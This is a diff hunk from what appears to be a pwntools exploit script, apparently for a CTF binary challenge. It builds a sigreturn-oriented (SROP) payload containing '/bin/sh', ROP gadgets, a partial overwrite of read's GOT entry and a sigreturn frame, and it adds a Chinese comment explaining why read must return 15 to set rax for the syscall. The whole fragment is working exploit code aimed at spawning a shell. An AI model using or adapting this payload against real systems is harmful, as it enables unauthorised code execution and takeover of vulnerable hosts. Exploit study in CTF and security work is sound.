@@ -57,7 +57,7 @@ frame.rip = ret
 payload = b"/bin/sh\x001111"
 payload += p64(bss + 0x700)
 payload += p64(pop_rsi)
-payload += p64(read_got - 14)
+payload += p64(read_got - 14) # read后要rax=15，read返回读取的字符长度
 payload += p64(read_plt) # read最后一个字节改为0x98
 payload += p64(read_plt) # srop走起
 payload += bytes(frame)
